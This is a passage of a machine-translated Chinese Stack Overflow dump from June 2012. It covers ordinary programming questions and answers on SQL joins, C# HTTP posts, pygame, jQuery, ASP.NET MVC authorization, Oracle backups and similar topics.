INNER JOIN dbo.tblPatientClaims AS pc
ON c.id = pc.id
INNER JOIN dbo.tblPatient AS p
ON pc.patientid = p.patientID
-- where exists tells SQL server you don't care how many 
-- visits took place, as long as there was at least one:
WHERE EXISTS (SELECT 1 FROM dbo.tblPatientVisits AS pv
  WHERE pv.patientID = p.patientID); 
```

这仍将为每个患者/索赔组合返回一行，但它应该只为每个患者/就诊组合返回一行。再一次，真的感觉设计不在这里。您还应该养成使用表别名的习惯——它们使您的查询更容易阅读，特别是如果您坚持使用凌乱的`tbl`前缀。`dbo`在创建和引用对象时，您还应该始终使用（或您使用的任何模式）前缀。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:32:16.473

我不确定我是否理解索赔的概念，但我怀疑您想删除索赔和患者之间的链接表，而是在患者就诊和索赔之间建立关联。

这对你会更好吗？

# algorithm - 二叉树中节点之间的距离？

> ID：11091203
> 
> 赞同：0
> 
> 时间：2012-06-18T21:16:39.063
> 
> 标签：algorithm, recursion, distance

这一定是递归算法

`dis(tree, x, y)`<--函数调用 x & y 是节点

每个递归调用返回 (dx, dy, dxy) dx 是 x 的深度 dy 是 y 的深度 dxy 是彼此之间的距离

我正在考虑使用最低的共同祖先，但这不适合这种格式（没有全局变量）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:24:58.137

> 这一定是递归算法

我假设您的意思是对您想要的答案的限制（有迭代解决方案）。递归（函数式）解决方案如下：

```
dis(tree, x, x) = 0

dis(tree, x, NULL) = INF
dis(tree, NULL, x) = INF 

dis(tree, x, y) = min(dis(tree, parent(x), y)+1, dis(tree, x, parent(y))+1) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:26:29.400

如果树是双向链接的，您可以从节点 x 搜索节点 y 进行广度优先搜索。

# java - 更新 1.6.0.33 后，Java Applet 未在 Mac 上加载

> ID：11091205
> 
> 赞同：1
> 
> 时间：2012-06-18T21:16:40.163
> 
> 标签：java, macos, applet

在最新的 java 更新后，我的小程序已停止加载。看来苹果已经修复了一些小程序安全漏洞，这就是导致我的小程序停止工作的原因。我的小程序使用多个签名的 jar 并且都已正确签名。我已启用小程序以在 java 首选项中运行，但这也没有解决问题。

我认为这个问题可能与我将签名的 jar 下载到的位置有关。目前它们被保存在一个隐藏目录中：

$HOME/myapp/

我认为这些罐子需要放在这里。

$HOME/库/应用程序支持/myapp/

有谁知道苹果是否对这些文件应该下载到哪里以及为什么有任何指示？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T08:41:05.540

我有同样的问题。您使用哪个标签来加载小程序？我从`<object>`to切换到`<applet>`它似乎可以工作，即使 applet 标签已被弃用。

# ruby-on-rails - 将 Rails 数据添加到 Highcharts 系列

> ID：11091207
> 
> 赞同：0
> 
> 时间：2012-06-18T21:16:42.197
> 
> 标签：ruby-on-rails, ruby, highcharts

我正在尝试使用 highcharts 制作一个图表来显示用户的体重。我包含了所有正确的 js 文件，当传递一个简单的整数数组时，它工作得很好。但是，在阅读了 highcharts 文档后，我不确定如何使用 rails 将正确的数据传递到系列选项中。

我的用户模型如下：

一个用户有很多 weight_ins，其中有 weight:float user_id:integer id:integer created_at:datetime 字段。（如果这是相关的）

下面是我的观点，如您所见，我尝试遍历用户权重，然后将其作为数据传递。我知道它需要输入 json 和一个数组，但我不确定如何格式化我的数据以适应这种方式。

```
 borderWidth: 0
            },
            series: [{
                    pointInterval: <%= 1.day * 1000 %>,
                    name: 'weight',
                    data: <% @user.weigh_ins.each do |weight| %>
                                            <%= weight.weight.to_json %>
                                            <% end %>

            }] 
```

如果还有更多代码需要发布，请大声喊叫。

任何建议将不胜感激。

Thata defo 在正确的轨道上，但是，数据是动态的，因此用户可以每天更新他们的权重，因此图表也需要更新。如果我使用上面的方括号，那么图形甚至不会呈现。现在我有了这个，但它也没有产生正确的输出。我需要为正确的用户找到 weight_ins，然后遍历所有这些并选择作为浮点数的重量数字。不知道如何解决它。

```
 data: <% user = @user.weigh_ins %> 
       <% user.each do |user_weight| %> 
       [<%= user_weight.weight %> ] 
       <% end %> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-30T15:50:29.803

我与此代码类似：

```
<% bio_array = Array.new(@bio.size) %>

<% @biometrics.each_with_index {|x, index| %>
    <% bio_array += [x[:weight]]    %>
<% } %>

(... some code ...)

series: [{
        name: 'Some Name',
        data: <%= bio_array %> 
```

请注意，此代码并未针对您的情况进行优化（在我的情况下，我省略了其他逻辑，因为对您的情况无用 - 我有一个带有 [数据和值] 的多维数组）。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-19T00:05:58.697

如果你想解析这样的数据，你真的不必使用 Json，因为你不会动态更新，你可以像 [34,32,24,25,12] 一样回显它，首先你要从 Ruby 制作那个 String ，这正是 json 的用途，检查你的 Json 输出，顺便说一句，尝试回显一些 Ruby String 之类的

```
 => 1,2,3,4,5 [<% echo str %> ] 
```

如果你的 json 输出 hv 没有方括号 [] 然后尝试添加它们

```
 data:[ <% @user.weigh_ins.each do |weight| %> ] 
```

# c# - 带边界的 C# HTTP POST

> ID：11091208
> 
> 赞同：3
> 
> 时间：2012-06-18T21:16:44.567
> 
> 标签：c#, httpwebrequest, http-post

我需要一些帮助来设置 C# 中的 HTTP Post。感谢我提前收到的任何帮助。

在这里使用 Fiddler 是我的 RAW POST：

```
POST http://www.domain.com/tester.aspx HTTP/1.1
User-Agent: Tegan
Content-Type: multipart/form-data; boundary=myboundary
Host: www.domain.com
Content-Length: 1538
Expect: 100-continue

<some-xml>

        <customer>
                <user-id>george</user-id>
                <first-name>George</first-name>
                <last-name>Jones</last-name>
        </customer>

</some-xml> 
```

我的要求有点棘手。他们需要一个带有边界的多部分帖子。我不熟悉设置边界。如果有人可以提供帮助，我将不胜感激。

**以下是我的要求：**

```
POST http://www.domain.com/tester.aspx HTTP/1.0(CRLF)
User-Agent: myprogramname(CRLF)
Content-Type: multipart/form-data; boundary=myboundary(CRLF)
Content-Length: nnn(CRLF)
(CRLF)
(CRLF)
--myboundary(CRLF)
Content-Disposition: form-data; name=”xmlrequest”(CRLF)
Content-Type: text/xml(CRLF)
(CRLF)
(XML request message)(CRLF)
(CRLF)
--myboundary--(CRLF) 
```

所以我认为这就是 POST 的样子，但我需要一些关于我的 C# 的帮助。

```
POST http://www.domain.com/tester.aspx HTTP/1.1
User-Agent: Tegan
Content-Type: multipart/form-data; boundary=myboundary
Content-Length: 1538

--myboundary
Content-Disposition: form-data; name="xmlrequest"
Content-Type: text/xml

<some-xml>

            <customer>
                    <user-id>george</user-id>
                    <first-name>George</first-name>
                    <last-name>Jones</last-name>
            </customer>

    </some-xml>

(CRLF)
--myboundary-- 
```

这是我用来创建 WebRequest 的 C# 代码。

```
HttpWebRequest request = null;
Uri uri = new Uri("http://domain.com/tester.aspx");
request = (HttpWebRequest)WebRequest.Create(uri);
request.Method = "POST";
request.UserAgent = "NPPD";
request.ContentType = "multipart/form-data; boundary=myboundary";
request.ContentLength = postData.Length;

using (Stream writeStream = request.GetRequestStream())
{
    writeStream.Write(postData, 0, postData.Length);
}
string result = string.Empty;
using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
{
    using (Stream responseStream = response.GetResponseStream())
    {
        using (StreamReader readStream = new StreamReader(responseStream, Encoding.UTF8))
        {
            result = readStream.ReadToEnd();
        }
    }
}
return result; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-18T21:19:01.323

我写了一篇关于这个的博客，并展示了一个可用于发送`multipart/form-data`请求的示例方法。在这里结帐：[http ://www.bratched.com/en/home/dotnet/69-uploading-multiple-files-with-c.html](http://www.bratched.com/en/home/dotnet/69-uploading-multiple-files-with-c.html)

# java - 在 Android 上使用 OpenGL 绘制视频帧

> ID：11091215
> 
> 赞同：2
> 
> 时间：2012-06-18T21:17:19.373
> 
> 标签：java, android, opengl-es

我目前正在开发一个通过 Android 上的 OpenGL ES 1.0 显示视频帧（作为位图）的系统。我的问题是我无法获得超过 10 fps 的速度。

在进行了一些测试之后，我确定最大的瓶颈之一是位图的宽度和高度都必须是 2 的幂。例如，必须将 640x480 视频放大到 1024x1024。在没有缩放的情况下，我能够获得大约 40-50fps，但纹理只是看起来是白色的，这对我没有好处。

我知道 OpenGL ES 2.0 支持使用两个纹理的非幂，但我对着色器/2.0 中的任何其他新内容没有经验

有什么办法可以解决这个问题吗？与我所拥有的相比，其他视频播放器如何获得如此出色的性能？我已经包含了一些代码供参考。

```
private Bitmap makePowerOfTwo(Bitmap bitmap)
{
    // If one of the bitmap's resolutions is not a power of two
    if(!isPowerOfTwo(bitmap.getWidth()) || !isPowerOfTwo(bitmap.getHeight()))
    {
        int newWidth = nextPowerOfTwo(bitmap.getWidth());
        int newHeight = nextPowerOfTwo(bitmap.getHeight());

        // Generate a new bitmap which has the needed padding
        return Bitmap.createScaledBitmap(bitmap, newWidth, newHeight, true);
    }
    else
    {
        return bitmap;
    }
}

private static boolean isPowerOfTwo(int num)
{
    // Check if a bitwise and of the number and itself minus one is zero
    return (num & (num - 1)) == 0;
}

private static int nextPowerOfTwo(int num)
{
    if(num <= 0)
    {
        return 0;
    }

    int nextPowerOfTwo = 1;

    while(nextPowerOfTwo < num)
    {
        nextPowerOfTwo <<= 1; // Bitwise shift left one bit
    }

    return nextPowerOfTwo;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-18T23:52:55.353

仅仅因为纹理必须是 2 的幂，并不意味着您的数据必须是 2 的幂。

您可以在初始化期间自由创建 1024x1024（或 1024x512）纹理，使用`glTexImage`用您的位图数据填充较低的 640x480 `glTexSubImage`，然后使用一些智能 texcoords 显示纹理的较低 640x480 `(0,0) to (640/1024, 480/1024)`。纹理的其余部分将只包含从未见过的空白空间。

# perl - 如何使用perl更改网络共享文件夹中文件的属性？

> ID：11091217
> 
> 赞同：1
> 
> 时间：2012-06-18T21:17:22.720
> 
> 标签：perl, networking, attributes, visibility, shared

如何将网络共享文件夹中文件的属性更改为隐藏。
perl 怎么可能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:38:14.787

```
use Win32::File qw( GetAttributes SetAttributes );

my $qfn = "\\\\server\\share\\dir\\file";
# or: "//server/share/dir/file"

GetAttributes($qfn, my $attrs) or die $^E;
$attrs |= Win32::File::HIDDEN;
SetAttributes($qfn, $attrs) or die $^E; 
```

[Win32::文件](http://search.cpan.org/perldoc?Win32%3a%3aFile)

笔记：

*   它没有记录，但`$^E`应该提供错误消息。
*   Get-modify-set 避免破坏任何现有属性。

# php - 在 PHP 中，如何格式化从数据库中收集的日期？

> ID：11091220
> 
> 赞同：1
> 
> 时间：2012-06-18T21:17:38.767
> 
> 标签：php, date, format

我一直在尝试使用`date_format`，但据我所知，它只需要时间戳，然后以您想要显示的任何方式格式化日期。

我的问题如下，我的数据库中的日期格式如下：

```
 2012-05-14 // (Y-m-d) 
```

我想将它们显示为：`June 14th, 2012`或最接近的格式。

PHP中是否有任何内置日期来进行这种转换？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:21:38.890

在数据库中进行转换，因此您不必每次都通过各种字符串/二进制格式进行多次往返：

```
SELECT DATE_FORMAT(yourdatefield, '%M %D, %Y') 
```

相关文档：http: [//dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date-format](http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date-format)

其他任何事情都需要以下转换序列：

```
mysql native -> mysql string -> php string -> php timestamp -> php string
v.s.
mysql native -> mysql string -> php string 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:25:22.647

你可以尝试这样的事情：

```
$date_string = 2012-05-14;
$formatted_date = date('F jS, Y', strtotime($date_string));
echo $formatted_date; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T21:21:31.057

```
<?php echo date('F jS, Y', strtotime('2012-06-14')); ?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-18T21:22:43.863

[http://php.net/manual/en/function.date.php](http://php.net/manual/en/function.date.php)

`echo date("F jS, Y", strtotime($mysql_row_date_goes_here));`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-18T21:23:22.183

您可以使用`strtotime()`将日期转换为时间，然后使用`date()`. 或者您可以告诉您的数据库如何使用适当的 SQL 格式化日期。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-18T21:24:53.960

您还可以使用 createFromFormat：

```
date = DateTime::createFromFormat('Y-m-d', $yourTimeString);
echo $date->format('F jS, Y'); 
```

# null - EasyMock andReturn() 空返回值

> ID：11091224
> 
> 赞同：11
> 
> 时间：2012-06-18T21:17:55.877
> 
> 标签：null, easymock

我已经使用 EasyMock 构建了一个模拟对象，并且我试图让该对象在方法调用后返回另一个对象。该方法调用不会引发任何异常，但它返回 null，尽管我确信该`andReturn()`调用有一个非 null 参数。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-06-18T21:17:57.407

这里的问题是我在指定行为后没有调用`replay()`模拟对象。出于某种原因，这导致它允许一些预期的行为，但在预期返回值时总是返回 null。`replay()`记得在使用模拟之前打电话。

# javascript - 从对象数组中删除对象

> ID：11091228
> 
> 赞同：0
> 
> 时间：2012-06-18T21:18:10.043
> 
> 标签：javascript, jquery

您好，我试图从我拥有的对象数组中删除对象，然后创建另一个新对象（我正在使用 $.map() 创建新对象）

要从 object(x) 中删除此对象，它的 object.number 必须与 array(y) 中的数字之一匹配

以下代码有效，但我只删除了具有 object.number = 40 [DEMO的对象](http://jsfiddle.net/minagabriel/C3d9T/4/)

代码 ：

```
 var x =[ //this is the object 
  {name : 'mark' , number : '10' , color:'green'},
  {name : 'jeff' , number : '15' , color:'blue'} ,
  {name : 'joy' , number : '30' , color:'yellow'},
  {name : 'mick' , number : '15' , color:'red'},
  {name : 'mick' , number : '40' , color:'black'}] ; 

      var y =['40','15']; // i need to remove all object.number that match the 
        // number in this array

     var newObject = $.map(x  ,function(index, value){
        for(i in y){
         if(index.number == y[i])
        {return null ; }
       else{
        return index;
            }      
      }

    });
 console.log(newObject);​ 
```

上面的代码只删除了 object.number 中有 40 的对象，我怎样才能使它工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:29:10.647

使用以下：

```
var newObject = $.map($.makeArray(x), function(index, value){  
    return y.indexOf(index.number) != -1 ? null : index;
}); 
```

`$.makeArray()`如果您的数组可以包含无序数据，则不是必需的，但建议使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:30:31.917

我在[这里](http://jsfiddle.net/C3d9T/6/)更新了你的小提琴。基本上你没有检查删除数组中的每个值。

```
var x =[
{name : 'mark' , number : '10' , color:'green'},
{name : 'jeff' , number : '15' , color:'blue'} ,
{name : 'joy' , number : '30' , color:'yellow'},
{name : 'mick' , number : '15' , color:'red'},
{name : 'mick' , number : '40' , color:'black'}] ; 

var y =['40','15'];

var newObject = $.map(x  ,function(index, value){

    var valid = true;
    for(var i = 0; i < y.length; i++){

        if(index.number == y[i])
           valid = false;             
    }
    if(valid)return index;
    else return null;
    });
console.log(newObject);​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-18T21:27:26.157

试试这个代码：

```
var newObject = $.map(x, function(index, value){  
    return (y.indexOf(index.number) != -1) ? null : index;
}); 
```

[http://jsfiddle.net/Dc68W/](http://jsfiddle.net/Dc68W/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-18T21:27:35.897

尝试更改您的功能，如下所示，

```
var newObject = $.map(x, function(value, index) {   
   if ($.inArray(value.number, y) == -1) {
       return value;
   } else {
       return null;
   }
}); 
```

**演示：http:** [//jsfiddle.net/skram/C3d9T/7/](http://jsfiddle.net/skram/C3d9T/7/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-18T21:25:39.167

这就是你想要的：

```
var newObject = $.map(x  ,function(index, value){
    for(i in y){
        if(index.number == y[i])
            return null;
    }
    return index;
});
console.log(newObject);​ 
```

和[jsFiddle](http://jsfiddle.net/C3d9T/5/)。顺便说一句：我认为使用`for(i in y)`数组不是一个好习惯（数组可能有其他属性）。您应该使用标准：

```
var l = y.length;
for(var i = 0; i < l; i++){
    /* the other code */
} 
```

注意长度缓存。

# oracle - Oracle 数据库开始/结束备份的 EBS 快照剖析

> ID：11091231
> 
> 赞同：1
> 
> 时间：2012-06-18T21:18:20.067
> 
> 标签：oracle, amazon-ec2, amazon-web-services, backup, snapshot

在 AWS 论坛上问[这个问题](https://forums.aws.amazon.com/thread.jspa?messageID=315943)不走运，所以在这里试试运气：

我对 EBS 快照期间事件顺序的粗略理解：

1.  同步 (??) < 1s
2.  拍摄快照 < 1s（原子？）
3.  将快照或与此卷的先前快照的任何增量差异（如果有）复制到 S3 < 1 小时（希望如此）

请在此处添加任何其他步骤，最重要的是我在询问上面的实际快照事件 #2：我可以将其视为一个短事件（< 1s）吗？它是块设备内的原子操作吗？我如何确定它何时完成（当 ec2-create-snapshot 命令返回成功时）？挂起状态指的是什么（只是复制过程）？

简而言之，我可以安全地做： ALTER DATABASE BEGIN BACKUP ec2-create-snapshot ALTER DATABASE END BACKUP

还是我必须等到快照过程完全可用（未挂起）才能结束备份？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-25T17:57:08.753

Eric Hammond[在另一个线程中的](https://stackoverflow.com/questions/8704881/snapshot-of-ebs-volume-used-for-replication)一些有用评论：

> 在您开始创建快照后，您的应用程序/数据库可以自由使用卷上的文件系统，但如果您有大量写入，您可能会遇到高 iowait，有时足以使您的应用程序明显变慢。原因是后台快照进程需要先将一个块复制到 S3，然后才能允许写入活动卷上的该块。

因此，根据[我对](http://www.bluegecko.net/oracle/oracle-tablespace-hot-backup-mode-revisited/)Oracle 更强大的`ALTER DATABASE BEGIN BACKUP`操作的理解，我更愿意等到快照完成（未挂起）再发出关闭的`ALTER DATABASE END BACKUP`.

# c# - 从应用程序中启动和停止本地 mysql 实例

> ID：11091232
> 
> 赞同：0
> 
> 时间：2012-06-18T21:18:20.000
> 
> 标签：c#, mysql, winforms

我的任务是编写一些内部管理软件。该软件与在线 MySQL 数据库对话。但是，如果没有互联网连接，那么系统应该使用本地“离线”MySQL 数据库。

起初，我尝试使用远程 MySQL 和本地 SQLCE 来执行此操作。可悲的是，查询字符串是如此不同，以至于不可行。

那么我的问题是；如何在加载应用程序时在特定端口上启动 MySQL 实例，然后在软件关闭时关闭实例？

我之前已经将 XAMPP 与一个软件捆绑在一起，但不确定在这种情况下这是否是正确的方法？

```
ProcessStartInfo test = new ProcessStartInfo(Application.StartupPath + @"mysqldb\bin");
        test.FileName = @"mysqld.exe";
        test.UseShellExecute = true;
        Process.Start(test); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T21:22:13.187

您或许应该在本地和外部安装 MySQL 数据库。加载软件时，只需使用本地数据库即可。一切正常后，将本地与实时数据库同步，并将数据库链接从本地切换到实时。不要停止本地数据库，因为如果 Internet 出现故障，您需要能够使用本地数据库保存数据。

始终与本地实时同步，因此如果 Internet 已启动，请使用实时数据库以及本地数据库。一切都需要同步。然后，数据将始终作为“备份”或离线数据库保存在计算机上，您的实时数据库将拥有来自任何地方的所有内容。

使用缓冲区，因此您需要在空白中放松查询。此外，在 Windows 下，您可以使用 service 来启动和停止 MySQL。

我希望我回答了你的一些问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T21:31:14.517

例如 PathtoMysql 就像 C:\Program Files\MySQL\MySQL Server 5.0\bin

通过在安装路径中运行 mysqld.exe 来启动服务器。

用 MySqlAdmin -u root -p rootpassword 关闭它

端口号将要开启，将在 my.ini 中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-09-21T06:39:51.337

*即使这个问题现在已经很老了，希望这对将来的任何人都有帮助。请注意，对于 WPF 应用程序，需要稍作修改*

将此命名空间添加到您的项目中：

```
using System.Diagnostics; 
```

将 MySQL 服务器嵌入到您的应用程序目录中：

```
YOUR APP DIR
..mysql-server   <=== This is the mysql server directory under your App dir. 
```

现在在`load`事件中启动 mysql 服务器：

```
 Process mysqlCMD = new Process();
  mysqlCMD.StartInfo.FileName = Environment.CurrentDirectory + "\\mysql-server\\bin\\mysqld.exe";
  mysqlCMD.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // This is to hide the black CMD window
  mysqlCMD.Start(); 
```

万一你必须停止mysql服务器，`closing`否则下次启动时会出现问题：

```
 Process mysqlCloseCMD = new Process();
  mysqlCloseCMD.StartInfo.FileName = Environment.CurrentDirectory + "\\mysql-server\\bin\\mysqladmin.exe";
  mysqlCloseCMD.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
  mysqlCloseCMD.StartInfo.Arguments = "--user=root shutdown";
  mysqlCloseCMD.Start(); 
```

# c# - 限制对 MVC 操作的访问

> ID：11091235
> 
> 赞同：3
> 
> 时间：2012-06-18T21:18:42.507
> 
> 标签：c#, asp.net-mvc

我有一个 ASP.NET MVC 网站，在那里我建立了一个权限系统。例如，当当前用户没有足够的权限时，某些链接会被隐藏。但是，如果他们手动输入该链接的 URL，他们仍然可以访问内容。

我知道我可以使用该`[Authorize]`属性来阻止没有正确用户角色的用户，但是如何实现我自己的属性来阻止不满足自定义要求的用户的操作，而不必在每个操作中编写手动检查？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-18T21:21:23.193

您可以编写自定义`Authorize`属性并覆盖`AuthorizeCore`可以放置自定义授权逻辑的方法：

```
public class MyAuthorizeAttribute : AuthorizeAttribute
{
    protected override bool AuthorizeCore(HttpContextBase httpContext)
    {
        var authroized = base.AuthorizeCore(httpContext);
        if (!authroized)
        {
            return false;
        }

        // at this stage the base authorization process has passed.
        // now implement your custom authorization logic and return true or false

        // here you have access to the HttpContext and as a consequence to all
        // request and route parameters so you could implement any 
        // authorization logic you want

        // And of course if you want a completely custom authorization logic 
        // ignoring the base functionality don't call the base method above
        // but completely override anything here
    }
} 
```

现在剩下的就是用这个自定义属性来装饰相应的控制器/动作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-18T21:22:03.583

如果您使用 ASP.NET Membership，您可以配置 RoleProvider 并为您的用户提供角色。

然后，您可以使用 AuthorizeAttribute 上的 Roles 属性来检查角色。

```
[Authorize(Roles="Admin, SuperUser")] 
```

# python - Python Pygame 图像不显示

> ID：11091244
> 
> 赞同：1
> 
> 时间：2012-06-18T21:19:03.317
> 
> 标签：python, image, pygame

我正在尝试在 pygame 中显示游戏。但由于某种原因它不起作用，有什么想法吗？这是我的代码：

```
import pygame, sys
from pygame.locals import *
pygame.init()
screen=pygame.display.set_mode((640,360),0,32)
pygame.display.set_caption("My Game")
p = 1
green = (0,255,0)
pacman ="imgres.jpeg"
pacman_x = 0
pacman_y = 0
while True:
    pacman_obj=pygame.image.load(pacman).convert()
    screen.blit(pacman_obj, (pacman_x,pacman_y))
    blue = (0,0,255)
    screen.fill(blue)
    for event in pygame.event.get():
        if event.type == QUIT:
            pygame.quit()
            sys.exit()
        if event.type==KEYDOWN:
            if event.key==K_LEFT:
                p=0
    pygame.display.update() 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-18T21:40:33.940

只是一个猜测，因为我实际上并没有运行这个：

屏幕只是显示为蓝色而您缺少 pacman 图像吗？可能发生的情况是您将 pacman 移动到屏幕上，然后执行 screen.fill(blue)，这实际上是用蓝色覆盖您的 pacman 图像。尝试在您的代码中颠倒这些步骤（即，将屏幕填充为蓝色，然后再对 pacman 进行 blitting）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-07T03:23:11.960

如果屏幕显示为蓝色，那是因为您需要在完成后“blit”图像`screen.fill`

此外，必须在顶部定义蓝色，并且它应该位于不同的循环中。我会这样做：

```
 import pygame, sys
    from pygame.locals import *
    pygame.init()
    screen=pygame.display.set_mode((640,360),0,32)
    pygame.display.set_caption("My Game")
    p = 1
    green = (0,255,0)
    blue = (0,0,255)
    pacman ="imgres.jpeg"
    pacman_x = 0
    pacman_y = 0
    pacman_obj=pygame.image.load(pacman).convert()
    done = False
    clock=pygame.time.Clock()
    while done==False:
        for event in pygame.event.get(): 
            if event.type == pygame.QUIT:
                done=True
            if event.type==KEYDOWN:
                if event.key==K_LEFT:
                    p=0
        screen.fill(blue)
        screen.blit(pacman_obj, (pacman_x,pacman_y))

        pygame.display.flip()
        clock.tick(100)

    pygame.quit() 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-19T23:28:43.883

笔记：

*   您正在每帧创建一个新图像。这很慢。
*   blit 的坐标可以是`Rect()`s

这是更新的代码。

```
WINDOW_TITLE = "hi world - draw image "

import pygame
from pygame.locals import *
from pygame.sprite import Sprite
import random
import os

class Pacman(Sprite):
    """basic pacman, deriving pygame.sprite.Sprite"""
    def __init__(self, file=None):
        """create surface"""
        Sprite.__init__(self)
        # get main screen, save for later
        self.screen = pygame.display.get_surface()                

        if file is None: file = os.path.join('data','pacman.jpg')
        self.load(file)

    def draw(self):
        """draw to screen"""
        self.screen.blit(self.image, self.rect)

    def load(self, filename):
        """load file"""
        self.image = pygame.image.load(filename).convert_alpha()
        self.rect = self.image.get_rect()      

class Game(object):
    """game Main entry point. handles intialization of game and graphics, as well as game loop"""    
    done = False
    color_bg = Color('seagreen') # or also: Color(50,50,50) , or: Color('#fefefe')

    def __init__(self, width=800, height=600):
        """Initialize PyGame window.

        variables:
            width, height = screen width, height
            screen = main video surface, to draw on

            fps_max     = framerate limit to the max fps
            limit_fps   = boolean toggles capping FPS, to share cpu, or let it run free.
            color_bg    = backround color, accepts many formats. see: pygame.Color() for details
        """
        pygame.init()

        # save w, h, and screen
        self.width, self.height = width, height
        self.screen = pygame.display.set_mode(( self.width, self.height ))
        pygame.display.set_caption( WINDOW_TITLE )        

        # fps clock, limits max fps
        self.clock = pygame.time.Clock()
        self.limit_fps = True
        self.fps_max = 40        

        self.pacman = Pacman()

    def main_loop(self):
        """Game() main loop.
        Normally goes like this:

            1\. player input
            2\. move stuff
            3\. draw stuff
        """
        while not self.done:
            # get input            
            self.handle_events()

            # move stuff            
            self.update()

            # draw stuff
            self.draw()

            # cap FPS if: limit_fps == True
            if self.limit_fps: self.clock.tick( self.fps_max )
            else: self.clock.tick()

    def draw(self):
        """draw screen"""
        # clear screen."
        self.screen.fill( self.color_bg )

        # draw code
        self.pacman.draw()

        # update / flip screen.
        pygame.display.flip()

    def update(self):
        """move guys."""
        self.pacman.rect.left += 10

    def handle_events(self):
        """handle events: keyboard, mouse, etc."""
        events = pygame.event.get()

        for event in events:
            if event.type == pygame.QUIT: self.done = True
            # event: keydown
            elif event.type == KEYDOWN:
                if event.key == K_ESCAPE: self.done = True

if __name__ == "__main__": 
    game = Game()
    game.main_loop() 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2016-02-21T07:50:38.713

# 首先你blit图像然后用蓝色填充它，所以它可能只显示蓝屏，

解决方法：先把屏幕填蓝，然后blit。

```
import pygame, sys
from pygame.locals import *
pygame.init()
screen=pygame.display.set_mode((640,360),0,32)
pygame.display.set_caption("My Game")
p = 1
green = (0,255,0)
pacman ="imgres.jpeg"
pacman_x = 0
pacman_y = 0
while True:
    pacman_obj=pygame.image.load(pacman).convert()

    blue = (0,0,255)
    screen.fill(blue)   # first fill screen with blue
    screen.blit(pacman_obj, (pacman_x,pacman_y))  # Blit the iamge
    for event in pygame.event.get():
        if event.type == QUIT:
            pygame.quit()
            sys.exit()
        if event.type==KEYDOWN:
            if event.key==K_LEFT:
                p=0
    pygame.display.update() 
```

# javascript - 如何将主干模型插入子集合？

> ID：11091245
> 
> 赞同：1
> 
> 时间：2012-06-18T21:19:06.203
> 
> 标签：javascript, backbone.js, coffeescript

楷模：

```
class Device extends Backbone.Model
    url: '/device'
    initialize: ->
        console.log "Device model created..."
        @set
            controllers: new Controllers

class Controller extends Backbone.Model 
```

收藏：

```
class Controllers extends Backbone.Collection
    model: Controller 
```

代码：

```
device = new Device
controller = new Controller
controller1 = new Controller
controller.set
   name: "state1"
   value: "on"
controller1.set
   name: "state2"
   value: "on"
device.set 
   id: 1
   name: "foo"
   controllers: [controller, controller1] 
```

错误消息（在“控制器”上使用 .each 时）：

> TypeError: Object [object Object],[object Object] 没有方法'each'

这个想法是每个设备都拥有一个控制器的子集合。我的简单问题是如何将模型添加到这个子集合中？上面的代码似乎用数组覆盖了集合......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T21:35:17.210

您将属性替换`controllers`为`array`. 由于它是一个集合，因此您需要使用`add`或`reset`，具体取决于您想要做什么。

# .htaccess - 重定向到目标 url 并添加查询字符串

> ID：11091246
> 
> 赞同：0
> 
> 时间：2012-06-18T21:19:06.817
> 
> 标签：.htaccess, redirect, query-string

我正在尝试使用 htaccess 将网站上的一个页面重定向到另一个页面。我对此很陌生，但一直在阅读和阅读各处以弄清楚如何做到这一点，但没有成功。

我想重定向`www.example.se`到`www.example.se/index.php?template=<templatename>`

这可能吗？我将如何处理？很抱歉，如果我在这里问一个愚蠢的问题，但真的找不到解决方案，这让我发疯。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T21:29:55.460

尝试：

```
Redirect / /index.php?template=<templatename> 
```

如果您希望它是永久性的，请`301`在之后添加。`Redirect`

# mysql - 每个数据库/表的 MySQL 查询缓存

> ID：11091248
> 
> 赞同：2
> 
> 时间：2012-06-18T21:19:09.387
> 
> 标签：mysql, performance, caching

我有一台在 Linux 上运行的 MySQL 服务器。它有一些关键的应用程序，我们将查询缓存设置得尽可能高。我还有一些非关键数据库（wordpress / 等）。

问题：

